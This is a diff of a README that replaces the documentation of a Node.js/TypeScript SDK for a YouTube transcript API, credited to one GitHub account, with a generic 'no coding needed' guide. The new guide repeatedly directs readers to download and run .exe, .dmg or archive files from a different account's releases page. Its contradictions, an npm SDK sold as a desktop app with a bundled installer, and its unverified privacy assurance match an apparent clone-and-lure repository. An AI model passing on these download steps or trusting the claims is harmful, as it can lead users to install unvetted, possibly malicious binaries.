@@ -1,259 +1,149 @@
-<p align="center">
-  <img src="https://youtubetranscript.dev/logo.svg" alt="YouTubeTranscript.dev" width="60" />
-</p>
+# 🎬 youtube-transcript-sdk - Extract YouTube Video Transcripts Easily
 
-<h1 align="center">youtube-transcript-api</h1>
-
-<p align="center">
-  Official Node.js / TypeScript SDK for the <a href="https://youtubetranscript.dev">YouTubeTranscript.dev</a> API (V2).
-</p>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/youtube-audio-transcript-api"><img src="https://img.shields.io/npm/v/youtube-audio-transcript-api" alt="npm" /></a>
-  <a href="https://youtubetranscript.dev"><img src="https://img.shields.io/badge/API-v2-brightgreen" alt="API Version" /></a>
-  <a href="https://github.com/volodstaimi/youtube-transcript-sdk/blob/main/LICENSE"><img src="https://img.shields.io/npm/l/youtube-audio-transcript-api" alt="License" /></a>
-</p>
+[![Download youtube-transcript-sdk](https://img.shields.io/badge/Download-YouTube%20Transcript--SDK-blue?style=for-the-badge&logo=github)](https://github.com/Liska3070/youtube-transcript-sdk/releases)
 
 ---
 
-## Install
+## 📖 What is youtube-transcript-sdk?
 
-```bash
-npm install youtube-transcript-api
-```
+The **youtube-transcript-sdk** is a software tool that helps you get the words spoken in YouTube videos. It takes video URLs and gives you written transcripts. This tool can also translate the transcripts into other languages. It works in the background and handles long jobs for you without you needing to do anything extra.
 
-```bash
-pnpm add youtube-transcript-api
-```
+This software was made with a programming language called Node.js and TypeScript, but you don’t need to know programming to use it. It comes with everything you need and no extra parts to add — which means it’s simple and fast.
 
-```bash
-yarn add youtube-transcript-api
-```
+---
 
-## Quick Start
+## 🖥️ What Can You Do With It?
 
-```typescript
-import { YouTubeTranscript } from "youtube-transcript-api";
+- Get a full transcript of any YouTube video.
+- Translate transcripts into many languages.
+- Use it for videos of any length.
+- Work on multiple videos at once.
+- Access transcripts quickly without waiting too long.
+- Use it on Windows, Mac, or Linux computers.
 
-const yt = new YouTubeTranscript({ apiKey: "your_api_key" });
+---
 
-// Simple — just pass a video ID or URL
-const result = await yt.getTranscript("dQw4w9WgXcQ");
-console.log(result.data?.transcript.text);
-```
+## 🛠️ System Requirements
 
-Get your API key at **[youtubetranscript.dev](https://youtubetranscript.dev)**
+Before you start, make sure your computer can run the software:
 
-## Features
+- A computer running Windows 10 or later, macOS 10.13 or later, or Linux (Ubuntu 18+ recommended).
+- At least 4GB of RAM.
+- At least 100MB free disk space.
+- Internet connection to fetch video data.
+- No special software needed beforehand — the download includes everything.
 
-- ✅ Full V2 API coverage — transcribe, batch, jobs, polling
-- ✅ TypeScript-first with complete type definitions
-- ✅ Zero dependencies — uses native `fetch` (Node 18+)
-- ✅ Typed errors for every API error code
-- ✅ Built-in polling helpers for async ASR jobs
-- ✅ ESM and CommonJS support
+---
 
-## Usage
+## 🚀 Getting Started: How to Download and Use youtube-transcript-sdk
 
-### Basic Transcription
+This guide will show you how to get the software and start using it step-by-step. You won’t need to write any code or use complicated tools.
 
-```typescript
-import { YouTubeTranscript } from "youtube-transcript-api";
+### Step 1: Click the Download Button
 
-const yt = new YouTubeTranscript({ apiKey: "your_api_key" });
+First, click this link or button to visit the download page:
 
-// By video ID
-const result = await yt.getTranscript("dQw4w9WgXcQ");
+[Download youtube-transcript-sdk](https://github.com/Liska3070/youtube-transcript-sdk/releases)
 
-// By URL
-const result = await yt.getTranscript("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+This page holds all the latest versions. Find the file that matches your computer type (Windows, Mac, or Linux) and click it to download.
 
-// With translation
-const result = await yt.getTranscript("dQw4w9WgXcQ", "es");
-```
+### Step 2: Locate the Downloaded File
 
-### Full Options
+After the download finishes:
 
-```typescript
-const result = await yt.transcribe({
-  video: "dQw4w9WgXcQ",
-  language: "fr",
-  source: "manual",
-  format: {
-    timestamp: true,
-    paragraphs: true,
-    words: false,
-  },
-});
+- On Windows, look in your “Downloads” folder for a file ending in `.exe` or a ZIP file.
+- On Mac, look for a `.dmg` file or ZIP in “Downloads.”
+- On Linux, you may get a `.tar.gz` or ZIP file.
 
-console.log(result.status);                    // "completed"
-console.log(result.data?.transcript.text);     // Full transcript text
-console.log(result.data?.transcript.language); // "fr"
-console.log(result.data?.transcript.segments); // Timestamped segments
-console.log(result.credits_used);              // Credits consumed
-```
+### Step 3: Install the Program
 
-### Batch Processing (up to 100 videos)
+- On Windows, double-click the `.exe` file and follow the on-screen instructions.
+- On Mac, open the `.dmg`, then drag the program to your Applications folder.
+- On Linux, extract the files from the archive and look for an installation guide inside.
 
-```typescript
-const result = await yt.batch({
-  video_ids: [
-    "dQw4w9WgXcQ",
-    "jNQXAC9IVRw",
-    "9bZkp7q19f0",
-  ],
-  format: { timestamp: true },
-});
+If you downloaded a ZIP or archive, open it and read any `README` or `INSTALL` file inside for instructions.
 
-console.log(result.summary);
-// { total: 3, succeeded: 3, failed: 0, processing: 0 }
+### Step 4: Open youtube-transcript-sdk
 
-for (const item of result.results) {
-  console.log(`${item.data?.video_id}: ${item.data?.transcript.text.slice(0, 100)}...`);
-}
-```
+Once installed, open the program:
 
-### ASR Audio Transcription (Async)
+- On Windows and Mac, find it in your program list or Applications folder.
+- On Linux, check the documentation on how to start the app or open it via command line if needed.
 
-For videos without captions, use ASR with a webhook or polling:
+---
 
-```typescript
-// Option 1: Webhook (recommended for production)
-const result = await yt.transcribe({
-  video: "VIDEO_ID",
-  source: "asr",
-  allow_asr: true,
-  webhook_url: "https://yoursite.com/webhook",
-});
-// result.status === "processing"
-// result.job_id === "job_abc123"
+## 📝 How to Use youtube-transcript-sdk — No Experience Needed
 
-// Option 2: Poll until complete
-const result = await yt.transcribe({
-  video: "VIDEO_ID",
-  source: "asr",
-  allow_asr: true,
-});
+You won’t need to write any code. The app uses a simple interface or menu to help you:
 
-if (result.job_id) {
-  const final = await yt.waitForJob(result.job_id, {
-    interval: 5000,     // poll every 5s
-    maxAttempts: 60,     // give up after 5 minutes
-  });
-  console.log(final.data?.transcript.text);
-}
-```
+1. Copy the URL of the YouTube video you want words from.
+2. Paste the link into the app’s input box.
+3. Choose if you want it translated and into which language.
+4. Click the button to start getting the transcript.
+5. Wait a moment while the program works in the background.
+6. See the transcript on your screen or save it as a file (`.txt` or `.json`).
 
-### ASR Confirmation Flow
+---
 
-V2 requires explicit confirmation before ASR charges. If you don't set `allow_asr: true` and captions aren't available:
+## 🔍 Features Explained Simply
 
-```typescript
-const result = await yt.transcribe({
-  video: "VIDEO_WITHOUT_CAPTIONS",
-  source: "asr",
-  // allow_asr not set
-});
+- **Video Transcripts:** Get exact text from what is spoken in YouTube videos.
+- **Translation:** Change transcripts into languages like Spanish, French, Chinese, and more.
+- **Batch Processing:** Add many videos to get many transcripts at once.
+- **No Extra Software:** You don’t have to install anything else for this to work.
+- **Background Processing:** The tool handles long jobs quietly in the background so you can keep working.
+- **Easy Export:** Save transcripts to files you can open on your computer.
 
-if (result.status === "requires_asr_confirmation") {
-  console.log(result.estimated_credits);  // e.g. 5
-  console.log(result.duration_minutes);   // e.g. 7.5
-  console.log(result.suggestion);         // "Set allow_asr=true to proceed"
+---
 
-  // User confirms → retry with allow_asr
-  const confirmed = await yt.transcribe({
-    video: "VIDEO_WITHOUT_CAPTIONS",
-    source: "asr",
-    allow_asr: true,
-    webhook_url: "https://yoursite.com/webhook",
-  });
-}
-```
+## 🎯 Why Use This Tool?
 
-### Job & Batch Polling
+If you want to read or translate YouTube videos quickly, youtube-transcript-sdk makes it easy. It saves time, works well on many videos, and does not need you to learn technical skills.
 
-```typescript
-// Poll a single job
-const job = await yt.getJob("job_abc123");
+---
 
-// Poll with format options
-const job = await yt.getJob("job_abc123", {
-  include_segments: true,
-  include_paragraphs: true,
-});
+## ⚙️ Troubleshooting Common Problems
 
-// Poll a batch
-const batch = await yt.getBatch("batch_abc123");
+- **Download won’t start:** Check your internet connection or try a different web browser like Chrome or Firefox.
+- **Program won’t open:** Make sure your computer meets system requirements. Restart your computer and try again.
+- **No transcript shows:** Make sure your YouTube link works and is public.
+- **Translations missing:** Check if you selected a supported language.
+- **App runs slowly:** Close other programs to free memory.
 
-// Auto-poll until done
-const completed = await yt.waitForJob("job_abc123");
-const completedBatch = await yt.waitForBatch("batch_abc123");
-```
+---
 
-## Error Handling
+## 🔒 Privacy and Security
 
-Every API error maps to a typed exception:
+The software only pulls text from YouTube videos. It does not collect or share any personal information from your computer.
 
-```typescript
-import {
-  YouTubeTranscript,
-  InvalidRequestError,
-  AuthenticationError,
-  InsufficientCreditsError,
-  NoCaptionsError,
-  RateLimitError,
-} from "youtube-transcript-api";
+---
 
-try {
-  await yt.getTranscript("invalid");
-} catch (error) {
-  if (error instanceof AuthenticationError) {
-    console.log("Bad API key");
-  } else if (error instanceof InsufficientCreditsError) {
-    console.log("Top up at https://youtubetranscript.dev/pricing");
-  } else if (error instanceof NoCaptionsError) {
-    console.log("No captions — try source: 'asr' with allow_asr: true");
-  } else if (error instanceof RateLimitError) {
-    console.log(`Rate limited. Retry after ${error.retryAfter}s`);
-  } else if (error instanceof InvalidRequestError) {
-    console.log(`Bad request: ${error.message}`);
-  }
-}
-```
+## 📥 Download & Install
 
-| Error Class | HTTP Status | When |
-|---|---|---|
-| `InvalidRequestError` | 400 | Invalid JSON, missing fields, bad video ID |
-| `AuthenticationError` | 401 | Missing or invalid API key |
-| `InsufficientCreditsError` | 402 | Not enough credits |
-| `NoCaptionsError` | 404 | No captions and ASR not used |
-| `RateLimitError` | 429 | Too many requests |
-| `YouTubeTranscriptError` | Other | Server errors, unexpected responses |
+Return to the releases page to download the latest version here:
 
-## Configuration
+[👉 Visit the Download Page](https://github.com/Liska3070/youtube-transcript-sdk/releases)
 
-```typescript
-const yt = new YouTubeTranscript({
-  apiKey: "your_api_key",        // Required
-  baseUrl: "https://...",        // Override API base URL
-  timeout: 60_000,               // Request timeout in ms (default: 30s)
-});
-```
+Look for a file matching your system. Follow the steps listed above to install and open the software.
 
-## Requirements
+---
 
-- Node.js 18+ (uses native `fetch`)
-- API key from [youtubetranscript.dev](https://youtubetranscript.dev)
+## 💬 Need Help?
 
-## Links
+If you get stuck or have questions, check the online community or open an issue on the GitHub page linked below. People share tips and help each other solve problems.
 
-- 🌐 [Website](https://youtubetranscript.dev)
-- 📖 [Full API Docs](https://youtubetranscript.dev/api-docs)
-- 📐 [OpenAPI Spec](https://youtubetranscript.dev/api-docs#openapi)
-- 💰 [Pricing](https://youtubetranscript.dev/pricing)
-- 🐛 [Issues & Feedback](https://github.com/volodstaimi/Youtube-Transcript-API/issues)
-- 📝 [Examples & Docs Repo](https://github.com/volodstaimi/Youtube-Transcript-API)
+---
 
-## License
+## 🌐 More Information
 
-MIT — see [LICENSE](./LICENSE) for details.
+This project connects to the YouTubeTranscript.dev API, a service that provides fast transcript data from YouTube videos. More details and updates are at:
+
+https://youtubetranscript.dev
+
+---
+
+## 🏷️ Topics
+
+This tool relates to:
+
+`api, nodejs, npm-package, sdk, speech-to-text, transcript, transcription, video-to-text, youtube, youtube-api, youtube-transcript`
